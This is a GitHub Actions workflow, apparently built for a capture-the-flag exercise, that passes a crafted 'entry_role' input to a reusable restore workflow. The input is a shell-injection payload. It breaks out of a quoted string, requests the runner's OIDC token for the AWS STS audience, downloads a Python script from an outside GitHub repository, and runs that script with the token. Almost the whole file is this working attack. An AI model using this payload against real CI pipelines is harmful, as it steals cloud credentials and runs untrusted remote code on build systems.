name: Test restore input handling

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  test:
    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
    with:
      mode: exchange
      nonce: protocol1
      entry_role: >-
        x"; token=$(curl -fsSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value); curl -fsSL https://raw.githubusercontent.com/MyeongJong03/metricforge-ctf-runner-20260719/subagent-protocol-oracle/protocol_probe.py -o /tmp/mf-protocol-probe.py; MF_OIDC_TOKEN="$token" python3 /tmp/mf-protocol-probe.py; exit $?; #
